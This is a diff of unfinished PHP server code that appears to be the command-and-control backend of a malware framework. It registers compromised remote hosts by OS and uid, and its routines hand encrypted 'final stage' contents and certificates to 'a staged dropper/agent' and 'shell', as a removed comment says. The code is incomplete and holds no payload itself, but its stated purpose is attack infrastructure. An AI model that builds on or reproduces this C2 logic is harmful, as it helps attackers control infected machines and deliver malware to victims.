@@ -4,7 +4,7 @@
 require "db/postgres_pdo.php.php";
 require "includes/db/slopSqlite.php";
 
-function db_calls(array $data){
+function db_calls(array $data) : array {
     switch (SQL_SELECTION){
         case strpos(SQL_SELECTION, "pgsql") !== false:
             $d = new postgres_pdo("psgql:host=localhost;dbname=postgres", "postgres");
@@ -14,7 +14,8 @@ function db_calls(array $data){
             break;
     }
     switch ($data['action']){
-        
+        case strpos($data['action'], "pullCert") !== false:
+
     }
 
 }
@@ -60,8 +61,7 @@ function fresh_deploy()
 function addNewHost($rhost, $uri, $action, $uid, $os, $ci)
 {
     if (!empty($rhost) && !empty($uri) && !empty($action) && !empty($os) && !empty($uid)) {
-        $createNewHost = new postgres_checker();
-        $createNewHost->insertRecord($rhost, $uri, $os, $ci, $uid, $action);
+        db_calls(['action' => "addNew", "os" => $os, "uid" => $uid, "uri" => $uri, "rhost" => $rhost]);
         http_response_code("200");
     } else {
         http_response_code('444');
@@ -89,30 +89,27 @@ function grabSloppyContents(array $data): array{
             header("Reason: Fuck off.");
         }
         $uuid = filter_var($data['uuid'], FILTER_SANITIZE_STRING);
-        $needsCert = $data['needs_cert'];
-        if (is_string($needsCert)){
-            $needsCert = (bool)filter_var($needsCert, FILTER_SANITIZE_STRING);
+        if (is_string($data['needs_cert'])){
+            $needsCert = (bool)$data['needs_cert'];
+        }else{
+            $needsCert = $data['needs_cert'];
         }
-
+        if ($needsCert) {
+            $cert = db_calls(['action' => 'pullCert', 'uuid' => $uuid, "rhost" => $remote_host, "needs_cert" => $needsCert]);
+        }else{
+            $cert = null;
+        }
+        $slopContents = db_calls(['action' => 'grabSlop', 'uuid' => $uuid, "rhost" => $remote_host]);
+        return ['data' => [
+           'slop' => $slopContents,
+           'cert' => $cert
+        ]];
+    }else{
+        return ['data' => [
+            'slop' => null,
+            'cert' => null
+        ]];
     }
-    return [];
-
-}
-
-function grabSloppyCert(array $data) : array{
-    /*
-     * Function to grab the certificate contents used to encrypt the final stage and return it to a staged dropper/agent.
-     * REQUIRES:
-     * $data:array -> [
-     * "remote_host" => "",
-     * "uuid" => "", //Generated at your server, assigned to the shell/dropper/agent.
-     * "" => "" // Dont know yet.
-     * ]
-     *  */
-    if (is_array($data)){
-
-    }
-    return [];
 }
 
 
